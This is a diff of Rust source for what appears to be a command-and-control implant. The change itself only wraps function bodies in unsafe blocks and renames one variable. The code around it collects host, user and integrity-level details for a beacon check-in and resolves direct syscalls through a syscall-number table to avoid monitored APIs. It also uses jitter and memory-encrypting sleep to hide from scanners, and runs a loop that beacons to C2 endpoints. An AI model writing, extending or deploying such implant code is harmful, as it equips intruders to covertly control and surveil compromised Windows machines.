@@ -30,7 +30,7 @@ struct SysInfo {
 /**
  * Generate a session ID by hashing PID + RDTSC 
  * */
-unsafe fn generate_session_id() -> String {
+unsafe fn generate_session_id() -> String { unsafe {
     let pid = get_current_pid();
     let tsc: u64;
     core::arch::asm!(
@@ -58,22 +58,22 @@ unsafe fn generate_session_id() -> String {
         id.push(hex_chars[nibble] as char);
     }
     id
-}
+}}
 
 /**
  * Get current process ID from TEB
  * */
-unsafe fn get_current_pid() -> u32 {
+unsafe fn get_current_pid() -> u32 { unsafe {
     let teb: u64;
     core::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);    
     let pid_ptr = (teb + 0x40) as *const u64; // TEB.ClientId.UniqueProcess at offset 0x40 on x64
     *pid_ptr as u32
-}
+}}
 
 /**
  * THIS IS NOT ACCURATE
  * */
-unsafe fn get_rough_timestamp() -> i64 {
+unsafe fn get_rough_timestamp() -> i64 { unsafe {
     let kuser_shared = 0x7FFE0000usize  as *const u8;
     // offset 0x14: SystemTime.LowPart, 0x18: SystemTime.High1Time
     let low = *(kuser_shared.add(0x14) as *const u32) as u64;
@@ -81,13 +81,13 @@ unsafe fn get_rough_timestamp() -> i64 {
     let filetime = (high << 32) | low;
     // convert windwos FILETIME to Unix epoch
     ((filetime - 116444736000000000) / 10000000) as i64
-}
+}}
 
 /**
  * Resolve the current process image name from PEB at runtime
  * PEB -> ProcessParameters -> ImagePathName (UNICODE_STRING)
  * */
-unsafe fn get_process_name_from_peb() -> String {
+unsafe fn get_process_name_from_peb() -> String { unsafe {
     let peb: usize;
     core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
     if peb == 0 { return String::from("unknown") }
@@ -115,12 +115,12 @@ unsafe fn get_process_name_from_peb() -> String {
     }
 
     wide_to_string(&path[last_sep..])
-}
+}}
 
 /**
  * Query the current process integrity level
  * */
-unsafe fn query_integrity_level() ->  &'static str {
+unsafe fn query_integrity_level() ->  &'static str { unsafe {
     let table = ssn_table::syscall_table();
     if table.ssns.nt_open_process_token.ssn == 0 || table.ssns.nt_query_information_token.ssn == 0 {
         return "unknown";
@@ -186,7 +186,7 @@ unsafe fn query_integrity_level() ->  &'static str {
         0x3000..=0x3FFF => "high",
         0x4000.. => "system",
     }
-}
+}}
 
 /**
  * Build the beacon check in JSON payload
@@ -210,7 +210,7 @@ fn build_beacon_json(session_id: &str, info: &SysInfo) -> Vec<u8> {
     w.finish()
 }
 
-unsafe fn gather_sysinfo() -> SysInfo {
+unsafe fn gather_sysinfo() -> SysInfo { unsafe {
     let table = ssn_table::syscall_table();
 
     // Hostname using GetComputerNameExW (ComputerNameDnsHostname = 3)
@@ -277,9 +277,9 @@ unsafe fn gather_sysinfo() -> SysInfo {
     let integrity = query_integrity_level();
 
     SysInfo { hostname, username, os_version, pid, process_name, arch: "x64", integrity }
-}
+}}
 
-unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) {
+unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) { unsafe {
     let actual_ms = if jitter_pct > 0 {
         let tsc: u64;
         core::arch::asm!(
@@ -301,9 +301,9 @@ unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) {
 
     // use encrypted sleep - xor memory, flip rx -> rw, sleep, flip rw -> rx, decrypt
     crate::core::sleep::encrypted_sleep(delay);
-}
+}}
 
-pub unsafe fn beacon_loop(config: &C2Config) {
+pub unsafe fn beacon_loop(config: &C2Config) { unsafe {
     if !ssn_table::initialize_network() {
         return;
     }
@@ -332,7 +332,7 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         0x0061, 0x0063, 0x006F, 0x006E, 0x0000,
     ];
     // /api/result
-    let result_path: [u16; 12] = [
+    let _result_path: [u16; 12] = [
         0x002F, 0x0061, 0x0070, 0x0069, 0x002F, 0x0072, 0x0065,
         0x0073, 0x0075, 0x006C, 0x0074, 0x0000,
     ];
@@ -382,7 +382,7 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         // Sleep with jitter
         beacon_sleep(interval, jitter)
     }
-}
+}}
 
 fn wide_to_string(wide: &[u16]) -> String {
     let mut s = String::with_capacity(wide.len());
